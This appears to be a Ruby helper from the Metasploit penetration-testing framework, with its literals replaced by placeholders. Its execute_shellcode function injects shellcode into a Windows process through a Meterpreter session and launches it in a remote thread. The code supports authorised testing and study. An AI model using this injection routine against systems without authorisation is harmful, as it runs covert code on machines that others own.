module Msf class Post module Windows module Process def execute_shellcode ( shellcode , base_addr = nil , pid = nil ) pid || = session . sys . process . getpid host = session . sys . process . open ( pid . to_i , PROCESS_ALL_ACCESS ) if base_addr . nil? shell_addr = host . memory . allocate ( shellcode . length ) else shell_addr = host . memory . allocate ( shellcode . length , nil , base_addr ) end host . memory . protect ( shell_addr ) if host . memory . write ( shell_addr , shellcode ) < shellcode . length vprint_error ( <str> ) return false end vprint_status ( <str> shell_addr . to_s ( <int> ) <str> pid . to_s <str> ) thread = host . thread . create ( shell_addr , <int> ) unless thread . instance_of? ( Rex :: Post :: Meterpreter :: Extensions :: Stdapi :: Sys :: Thread ) vprint_error ( <str> ) nil end thread end end end end end 
